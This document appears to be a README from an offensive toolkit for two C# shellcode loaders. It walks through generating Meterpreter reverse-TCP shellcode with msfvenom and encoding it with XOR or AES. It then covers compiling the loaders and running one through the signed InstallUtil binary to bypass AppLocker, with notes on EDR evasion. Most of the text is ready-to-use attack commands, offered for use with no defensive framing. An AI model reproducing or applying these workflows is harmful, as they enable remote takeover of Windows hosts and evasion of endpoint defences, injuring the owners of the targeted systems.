# shellcode-runners

Two files. Both are **standalone** — pick one based on your environment. They are not dependent on each other.

---

## File Roles

| File | Standalone? | When to use | Evasion level |
|------|-------------|-------------|---------------|
| `simple-runner.cs` | Yes | No restrictions (no AppLocker, Defender off/bypassed) | Low |
| `clrunner.cs` | Yes | AppLocker blocks your .exe | Medium |

---

## simple-runner.cs — The Basic Version

Allocates RWX memory in its own process, XOR-decodes shellcode (key `0xfa`), runs it via `CreateThread`. Simplest possible loader.

**Limitations:** RWX memory is an EDR red flag. Shellcode runs inside your process — if the process dies, the session dies.

**Workflow:**
```bash
# 1. Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# 2. XOR encode (key 0xfa)
python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format csharp

# 3. Paste output into buf[] in simple-runner.cs

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "runner", Framework: .NET Framework 4.8
#    Paste simple-runner.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\runner.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:runner.exe simple-runner.cs

# 5. Run
.\runner.exe
```

---

## clrunner.cs — The AppLocker Bypass Version

Same shellcode runner technique, but wrapped in the InstallUtil AppLocker bypass. Uses AES-encrypted shellcode with a placeholder IP trick (your actual IP is patched in at runtime — one binary works for any IP).

**How InstallUtil bypass works:** `InstallUtil.exe` is a Microsoft-signed Windows binary. It calls the `Uninstall()` method on a class tagged `[RunInstaller(true)]`. AppLocker rules block unsigned .exe files but not signed Windows binaries running other code.

**Workflow:**
```bash
# 1. Generate shellcode with placeholder IP (11.11.11.11) and port (4444)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=11.11.11.11 LPORT=4444 EXITFUNC=thread -f raw -o shell.bin

# 2. AES encrypt
python3 04-encoders/aes/shellcode_encoder.py shell.bin <YOUR_PASSWORD> aes

# 3. Paste AES-encrypted bytes into buf[] in clrunner.cs
#    Set the AES password and your real LHOST/LPORT in the constants at the top

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "clrunner", Framework: .NET Framework 4.8
#    Paste clrunner.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\clrunner.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:clrunner.exe clrunner.cs

# 5. Run via InstallUtil (bypasses AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clrunner.exe
```

---

## Which to choose?

- **No AppLocker, Defender bypassed** → `simple-runner.cs` (simpler, easier to debug)
- **AppLocker present** → `clrunner.cs`
- **Want injection instead of running in your own process** → see `process-injection/`
